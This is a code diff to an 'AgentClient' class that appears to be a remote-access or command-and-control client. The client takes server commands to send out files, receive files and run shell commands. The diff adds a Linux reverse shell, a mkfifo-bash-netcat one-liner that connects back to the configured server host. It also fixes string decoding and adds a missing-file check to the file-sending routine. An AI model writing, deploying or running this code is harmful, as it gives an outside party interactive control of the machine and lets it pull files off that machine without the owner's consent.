@@ -60,11 +60,11 @@ class AgentClient:
         cmd = cmd.decode("utf-8")
 
         if cmd.startswith("download "):
-            filepath = cmd.split()[1].decode('utf-8')
+            filepath = cmd.split()[1]
             self._send_file(filepath)
 
         elif cmd.startswith("SEND_FILE "):
-            filename = cmd.split()[1].decode("utf-8")
+            filename = cmd.split()[1]
             self._download_file(filename)
 
         elif cmd.startswith("shell "):
@@ -81,7 +81,11 @@ class AgentClient:
         try:
             import platform, os
             if platform.system() == "Linux":
-                pass
+                os.system(
+                    """
+                        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {} {} >/tmp/f
+                    """.format(self.server_host, port)
+                )
             elif platform.system() == "Windows":
                 os.system(
                     """
@@ -101,7 +105,12 @@ class AgentClient:
             logger.debug("[agent] Error in downloadfile %s", e)
 
     def _send_file(self, filename: str):
+        import os
+
         try:
+            if not os.path.exists(filename):
+                self._send_line(f"File not found %s" % filename)
+                return
             logger.debug(f"[agent] Downloading File {filename}")
             FileUtils.send_file(self.sock, filename)
         except Exception as e:
